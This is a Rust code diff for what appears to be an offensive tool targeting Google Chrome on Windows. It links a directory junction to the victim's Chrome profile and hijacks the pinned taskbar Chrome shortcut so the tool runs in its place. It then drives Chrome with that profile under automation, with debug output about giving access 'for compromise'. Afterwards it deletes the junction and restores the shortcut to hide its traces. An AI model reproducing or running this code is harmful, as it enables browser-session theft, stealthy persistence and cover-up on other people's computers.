@@ -2,8 +2,9 @@ use futures::StreamExt;
 use chromiumoxide::browser::{Browser, BrowserConfig};
 use std::fs;
 use std::env;
-use std::path::Path;
+use std::path::PathBuf;
 use std::time::Duration;
+use mslnk::ShellLink;
 
 #[async_std::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -11,36 +12,42 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[*] Retreaving username...");
     let username = env::var("USERNAME")?;
 
-    let junc_path = Path::new("C:\\temp\\pengrey");
+    let junc_path: PathBuf = PathBuf::from(format!("C:\\temp\\{}", username));
 
-    let chrome_path_string = format!(
-        "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data",
-        username
-    );
+    let chrome_data_path: PathBuf = PathBuf::from(&format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data", username));
 
-    let chrome_path = Path::new(&chrome_path_string);
+    let exe_path = std::env::current_exe()?;
+    let exe_path_str = exe_path.to_str().unwrap_or("");
 
     #[cfg(feature = "debug")]
     println!("[*] Checking if junction exists...");
-    if !junction::exists(junc_path)? {
+    if !junction::exists(&junc_path)? {
         #[cfg(feature = "debug")]
         println!("[*] Creating dir junction...");
-        junction::create(chrome_path, junc_path)?;
+        junction::create(chrome_data_path, &junc_path)?;
 
         #[cfg(feature = "debug")]
         println!("[*] Setting up persistence...");
-        phantom_persist_rs::register_application_restart();
+
+        let shortcut_path: PathBuf = PathBuf::from(&format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username));
+        if !shortcut_path.exists() {
+            eprintln!("Error: Shortcut does not exist at the specified path.");
+            return Ok(());
+        }
 
         #[cfg(feature = "debug")]
-        println!("[+] Registered application restart");
+        println!("[*] Creating new Chrome shortcut...");
+        let target = exe_path_str;
+        let start_in = exe_path.parent().and_then(|p| p.to_str()).unwrap_or("");
 
-        #[cfg(feature = "debug")]
-        println!("[+] Sleeping 60 seconds to ensure registration");
-        std::thread::sleep(std::time::Duration::from_secs(60));
+        let mut link = ShellLink::new(target).unwrap();
+        link.set_working_dir(Some(start_in.to_string()));
 
-        #[cfg(feature = "debug")]
-        println!("[+] Starting message loop thread. Go ahead shutdown/restart.");
-        phantom_persist_rs::message_loop_thread();
+        println!("\nNew shortcut properties defined:");
+        println!("- New Target: {}", target);
+        println!("- New 'Start In': {}", start_in);
+        link.create_lnk(&shortcut_path)?;
+
     } else {
         #[cfg(feature = "debug")]
         println!("[*] Starting browser...");
@@ -48,7 +55,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             .with_head()
             .arg("--start-maximized")
             .arg("--no-startup-window")
-            .user_data_dir(junc_path)
+            .user_data_dir(&junc_path)
             .viewport(None)
             .disable_default_args()
             .build()?
@@ -58,7 +65,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             while let Some(h) = handler.next().await {
                 match h {
                     Ok(_) => continue,
-                    Err(_) => break,
+                                            Err(_) => break,
                 }
             }
         });
@@ -67,8 +74,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let _ = browser.new_page("https://developer.chrome.com/new").await?;
 
         #[cfg(feature = "debug")]
-        println!("[*] Giving user access to user for compromise (1 min for test) ...");
-        async_std::task::sleep(Duration::from_secs(60)).await;
+        println!("[*] Sleeping (10 secs for test) ...");
+        async_std::task::sleep(Duration::from_secs(10)).await;
 
         #[cfg(feature = "debug")]
         println!("[*] Time is up.");
@@ -87,12 +94,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         #[cfg(feature = "debug")]
         println!("[*] Removing junction and dir...");
-        junction::delete(junc_path)?;
-        fs::remove_dir(junc_path)?;
+        junction::delete(&junc_path)?;
+        fs::remove_dir(&junc_path)?;
 
         #[cfg(feature = "debug")]
-        println!("[*] Sleeping 15 seconds to see results ...");
-        async_std::task::sleep(Duration::from_secs(15)).await;
+        println!("[*] Restoring Chrome shortcut...");
+        let target = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
+        let start_in = "C:\\Program Files\\Google\\Chrome\\Application";
+
+        let mut link = ShellLink::new(target.to_string())?;
+        link.set_working_dir(Some(start_in.to_string()));
+        let shortcut_path: PathBuf = PathBuf::from(&format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username));
+        link.create_lnk(&shortcut_path)?;
     }
 
     Ok(())
